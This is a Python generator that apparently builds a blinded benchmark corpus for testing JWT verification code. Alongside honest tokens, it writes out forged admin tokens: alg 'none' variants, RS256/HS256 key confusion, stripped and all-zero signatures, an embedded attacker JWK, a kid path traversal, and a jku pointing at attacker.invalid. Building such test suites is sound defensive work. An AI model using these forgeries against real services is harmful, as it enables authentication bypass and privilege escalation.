"""
scale30 corpus v3 generator (PREREG §4)
========================================
দুটো ফাইল লেখে:
  cases.json  — adapter শুধু এটা পড়ে: id, token, allowed_algs, key (hex/PEM/JWK), meta
  truth.json  — id → TokenTruth; adapter কখনো পড়ে না (blinding)

meta-তে শুধু token/key থেকে যা দেখা যায় তা থাকে (alg, key-variant, family) — truth নয়।
B2 profile এই (alg, variant) দিয়ে lookup করে।

key-generation seedable নয় (cryptography), তাই পুনরুৎপাদনযোগ্যতা = এই ফাইলগুলো
নিজেরাই artifact; sha256 `corpus_manifest.json`-এ। random choice-গুলো seeded।
"""
import json, hmac, hashlib, os, random, sys
from pathlib import Path
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519, ed448, padding
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
import operators as op  # noqa: E402

OUT = Path(__file__).resolve().parent
IAT, EXP = 1758758400, 4102444800          # 2025-09-25, 2100-01-01 (PREREG §1)
HL = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}
HC = {"256": hashes.SHA256(), "384": hashes.SHA384(), "512": hashes.SHA512()}
EC_CURVES = {"ES256": (ec.SECP256R1(), 32, "P-256", "256"), "ES384": (ec.SECP384R1(), 48, "P-384", "384"),
             "ES512": (ec.SECP521R1(), 66, "P-521", "512"), "ES256K": (ec.SECP256K1(), 32, "secp256k1", "256")}


def b64(x):
    return op.b64url(x if isinstance(x, bytes) else json.dumps(x, separators=(",", ":")).encode())


def claims(role, **extra):
    return {"sub": "alice", "role": role, "iss": "real-issuer", "iat": IAT, "exp": EXP, **extra}


def _int_b64(n, size=None):
    size = size or (n.bit_length() + 7) // 8
    return op.b64url(n.to_bytes(size, "big"))


# ── key presentation (adapter নিজের পছন্দের format নেয়) ──
def key_hmac(secret):
    return {"kind": "hmac", "secret_hex": secret.hex(), "jwk": {"kty": "oct", "k": op.b64url(secret)}}


def key_pub(pub):
    pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    if isinstance(pub, rsa.RSAPublicKey):
        n = pub.public_numbers()
        return {"kind": "rsa", "pem": pem, "jwk": {"kty": "RSA", "n": _int_b64(n.n), "e": _int_b64(n.e)}}
    if isinstance(pub, ec.EllipticCurvePublicKey):
        crv = {"secp256r1": ("P-256", 32), "secp384r1": ("P-384", 48), "secp521r1": ("P-521", 66),
               "secp256k1": ("secp256k1", 32)}[pub.curve.name]
        n = pub.public_numbers()
        return {"kind": "ec", "pem": pem, "jwk": {"kty": "EC", "crv": crv[0], "x": _int_b64(n.x, crv[1]),
                                                  "y": _int_b64(n.y, crv[1])}}
    raw = pub.public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    crv = "Ed25519" if isinstance(pub, ed25519.Ed25519PublicKey) else "Ed448"
    return {"kind": "okp", "pem": pem, "jwk": {"kty": "OKP", "crv": crv, "x": op.b64url(raw)}}


def signer(alg, k):
    bits = alg[2:5]
    if alg.startswith("HS"):
        return lambda si: hmac.new(k, si, HL[bits]).digest()
    if alg.startswith("RS"):
        return lambda si: k.sign(si, padding.PKCS1v15(), HC[bits])
    if alg.startswith("PS"):
        return lambda si: k.sign(si, padding.PSS(mgf=padding.MGF1(HC[bits]), salt_length=int(bits) // 8), HC[bits])
    if alg.startswith("ES"):
        _, size, _, hb = EC_CURVES[alg]
        def s(si):
            r, ss = decode_dss_signature(k.sign(si, ec.ECDSA(HC[hb])))
            return r.to_bytes(size, "big") + ss.to_bytes(size, "big")
        return s
    if alg == "EdDSA":
        return lambda si: k.sign(si)
    raise ValueError(alg)


def compact(header, payload, sign):
    h, p = b64(header), b64(payload)
    return f"{h}.{p}.{op.b64url(sign(f'{h}.{p}'.encode()))}"


class Corpus:
    def __init__(self):
        self.cases, self.truth = [], {}

    def add(self, cid, token, algs, key, alg, variant, family, seed, honest, attack_role=""):
        assert cid not in self.truth, cid
        self.cases.append(dict(id=cid, token=token, allowed_algs=algs, key=key,
                               meta=dict(alg=alg, variant=variant, family=family, seed=seed)))
        self.truth[cid] = dict(honestly_issued=honest, legit_role="user", attack_role=attack_role)


def gen_seed(C, s, rng):
    user = claims("user")
    # ── issuer keys for this seed ──
    hs = {"16B": None, "min": None, "64B": None}
    rsa_keys = {b: rsa.generate_private_key(65537, b) for b in (1024, 2048, 3072, 4096)}
    ec_keys = {a: ec.generate_private_key(c[0]) for a, c in EC_CURVES.items()}
    ed_keys = {"Ed25519": ed25519.Ed25519PrivateKey.generate(), "Ed448": ed448.Ed448PrivateKey.generate()}

    # ── V1: alg × key ──
    hs_secret = {}
    for alg in ("HS256", "HS384", "HS512"):
        for v in hs:
            n = {"16B": 16, "min": int(alg[2:]) // 8, "64B": 64}[v]
            sec = os.urandom(n); hs_secret[(alg, v)] = sec
            C.add(f"V1/{alg}/{v}/s{s}", compact({"alg": alg, "typ": "JWT"}, user, signer(alg, sec)),
                  [alg], key_hmac(sec), alg, v, "V1", s, True)
    for alg in ("RS256", "RS384", "RS512"):
        for b in (1024, 2048, 3072, 4096):
            k = rsa_keys[b]
            C.add(f"V1/{alg}/{b}/s{s}", compact({"alg": alg, "typ": "JWT"}, user, signer(alg, k)),
                  [alg], key_pub(k.public_key()), alg, str(b), "V1", s, True)
    for alg, sizes in (("PS256", (1024, 2048, 4096)), ("PS384", (1024, 2048, 4096)), ("PS512", (2048, 4096))):
        for b in sizes:
            k = rsa_keys[b]
            C.add(f"V1/{alg}/{b}/s{s}", compact({"alg": alg, "typ": "JWT"}, user, signer(alg, k)),
                  [alg], key_pub(k.public_key()), alg, str(b), "V1", s, True)
    for alg, k in ec_keys.items():
        C.add(f"V1/{alg}/{EC_CURVES[alg][2]}/s{s}", compact({"alg": alg, "typ": "JWT"}, user, signer(alg, k)),
              [alg], key_pub(k.public_key()), alg, EC_CURVES[alg][2], "V1", s, True)
    for crv, k in ed_keys.items():
        C.add(f"V1/EdDSA/{crv}/s{s}", compact({"alg": "EdDSA", "typ": "JWT"}, user, signer("EdDSA", k)),
              ["EdDSA"], key_pub(k.public_key()), "EdDSA", crv, "V1", s, True)

    # ── V2 (header) / V3 (claims) — base = RS256/2048 আর HS256/min ──
    bases = {"RS256/2048": ("RS256", "2048", rsa_keys[2048], key_pub(rsa_keys[2048].public_key())),
             "HS256/min": ("HS256", "min", hs_secret[("HS256", "min")], key_hmac(hs_secret[("HS256", "min")]))}
    v2 = {"kid": {"typ": "JWT", "kid": "issuer-key-1"}, "no_typ": {}, "typ_at": {"typ": "at+jwt"},
          "private_hdr": {"typ": "JWT", "x-tenant": "acme"}, "cty": {"typ": "JWT", "cty": "JWT"}}
    v3 = {"unicode": claims("user", name="আফ্রিদি Ünïcødé 🙂"), "bigint": claims("user", n=2 ** 60),
          "aud_array": claims("user", aud=["api", "web"]), "aud_string": claims("user", aud="api")}
    for bname, (alg, var, k, kp) in bases.items():
        for vname, extra in v2.items():
            # D2: issuer যে kid header-এ দেয়, সেটা তার প্রকাশিত JWK-তেও থাকে (বাস্তবসম্মত)
            kpv = {**kp, "jwk": {**kp["jwk"], "kid": extra["kid"]}} if "kid" in extra else kp
            C.add(f"V2/{bname}/{vname}/s{s}", compact({"alg": alg, **extra}, user, signer(alg, k)),
                  [alg], kpv, alg, var, "V2", s, True)
        for vname, pl in v3.items():
            C.add(f"V3/{bname}/{vname}/s{s}", compact({"alg": alg, "typ": "JWT"}, pl, signer(alg, k)),
                  [alg], kp, alg, var, "V3", s, True)

    # ── F1: curated DY forgeries (attacker জানে শুধু issuer-এর public key) ──
    admin = claims("admin")
    ipriv = rsa_keys[2048]; ipub = ipriv.public_key(); ikey = key_pub(ipub)
    pem = ipub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    der = ipub.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
    jwk_json = json.dumps(ikey["jwk"], separators=(",", ":")).encode()
    atk_rsa = rsa.generate_private_key(65537, 2048)
    hsec = hs_secret[("HS256", "min")]
    F = lambda name, tok, algs, key, alg, var: C.add(f"F1/{name}/s{s}", tok, algs, key, alg, var, "F1", s,
                                                     False, "admin")
    for i, nm in enumerate(("none", "None", "NONE", "nOnE")):
        F(f"alg_none_{i}", f"{b64({'alg': nm, 'typ': 'JWT'})}.{b64(admin)}.", ["RS256"], ikey, nm, "2048")
    for enc, secret in (("pem", pem), ("der", der), ("jwk", jwk_json)):
        F(f"confusion_{enc}", compact({"alg": "HS256", "typ": "JWT"}, admin, signer("HS256", secret)),
          ["RS256", "HS256"], ikey, "HS256", "2048")
    F("attacker_hmac", compact({"alg": "HS256", "typ": "JWT"}, admin, signer("HS256", os.urandom(32))),
      ["HS256"], key_hmac(hsec), "HS256", "min")
    F("attacker_rsa", compact({"alg": "RS256", "typ": "JWT"}, admin, signer("RS256", atk_rsa)),
      ["RS256"], ikey, "RS256", "2048")
    F("sig_strip", f"{b64({'alg': 'RS256', 'typ': 'JWT'})}.{b64(admin)}", ["RS256"], ikey, "RS256", "2048")
    F("sig_empty", f"{b64({'alg': 'RS256', 'typ': 'JWT'})}.{b64(admin)}.", ["RS256"], ikey, "RS256", "2048")
    F("embedded_jwk", compact({"alg": "RS256", "typ": "JWT", "jwk": key_pub(atk_rsa.public_key())["jwk"]},
                              admin, signer("RS256", atk_rsa)), ["RS256"], ikey, "RS256", "2048")
    F("kid_path", compact({"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}, admin,
                          signer("HS256", b"")), ["HS256"], key_hmac(hsec), "HS256", "min")
    F("jku", compact({"alg": "RS256", "typ": "JWT", "jku": "https://attacker.invalid/jwks.json", "kid": "a"},
                     admin, signer("RS256", atk_rsa)), ["RS256"], ikey, "RS256", "2048")
    F("ecdsa_zero", f"{b64({'alg': 'ES256', 'typ': 'JWT'})}.{b64(admin)}.{op.b64url(bytes(64))}",
      ["ES256"], key_pub(ec_keys['ES256'].public_key()), "ES256", "P-256")
    return dict(ipriv=ipriv, ikey=ikey, pem=pem, hsec=hsec)


def gen_f2(C, k, rng, n):
    """F2 — random_fuzz.attack_token-এর port (PREREG Deviation D1: crit শাখা বাদ, exp যোগ)।"""
    admin = claims("admin")
    for i in range(n):
        kind = rng.choice(["alg_none", "confusion", "wrong_key", "wrong_rsa", "format_confusion"])
        header = {"alg": "HS256", "typ": "JWT"}
        if rng.random() < 0.3:
            header["kid"] = rng.choice(["k1", "attacker", "../../etc"])
        cid = f"F2/{kind}/{i:04d}"
        if kind == "alg_none":
            header["alg"] = "none"
            C.add(cid, f"{b64(header)}.{b64(admin)}.", ["RS256", "HS256"], k["ikey"], "none", "2048", "F2", 1,
                  False, "admin")
        elif kind == "confusion":
            C.add(cid, compact(header, admin, signer("HS256", k["pem"])), ["RS256", "HS256"], k["ikey"],
                  "HS256", "2048", "F2", 1, False, "admin")
        elif kind == "wrong_key":
            atk = bytes(rng.getrandbits(8) for _ in range(32))
            C.add(cid, compact(header, admin, signer("HS256", atk)), ["HS256"], key_hmac(k["hsec"]),
                  "HS256", "min", "F2", 1, False, "admin")
        elif kind == "wrong_rsa":
            header["alg"] = "RS256"
            C.add(cid, compact(header, admin, signer("RS256", rsa.generate_private_key(65537, 2048))),
                  ["RS256"], k["ikey"], "RS256", "2048", "F2", 1, False, "admin")
        else:  # format_confusion — signed user payload, unsigned admin extra field (JWS JSON)
            real = claims("user")
            h, p = b64(header), b64(real)
            sig = signer("HS256", k["hsec"])(f"{h}.{p}".encode())
            tok = op.fn_json_with_extra(header, real, sig, "fakeiss", {"role": "admin"})
            C.add(cid, tok, ["HS256"], key_hmac(k["hsec"]), "HS256", "min", "F2", 1, False, "admin")


def main():
    # ব্যবহার: gen_corpus.py [outdir seed f2seed] — ডিফল্ট = মূল scale30 corpus (PREREG §4)
    global OUT
    seed, f2seed = 20260925, 1
    if len(sys.argv) == 4:
        OUT = Path(sys.argv[1]).resolve(); OUT.mkdir(parents=True, exist_ok=True)
        seed, f2seed = int(sys.argv[2]), int(sys.argv[3])
    rng = random.Random(seed)
    C = Corpus()
    keys = {s: gen_seed(C, s, rng) for s in (1, 2, 3)}
    gen_f2(C, keys[1], random.Random(f2seed), 2000)
    (OUT / "cases.json").write_text(json.dumps({"version": "v3", "cases": C.cases}, indent=0, ensure_ascii=False))
    (OUT / "truth.json").write_text(json.dumps(C.truth, indent=0))
    from collections import Counter
    fam = Counter(c["meta"]["family"] for c in C.cases)
    man = {"n_cases": len(C.cases), "families": dict(fam),
           "sha256": {f: hashlib.sha256((OUT / f).read_bytes()).hexdigest() for f in ("cases.json", "truth.json")}}
    (OUT / "corpus_manifest.json").write_text(json.dumps(man, indent=1))
    print(json.dumps(man, indent=1))


if __name__ == "__main__":
    main()
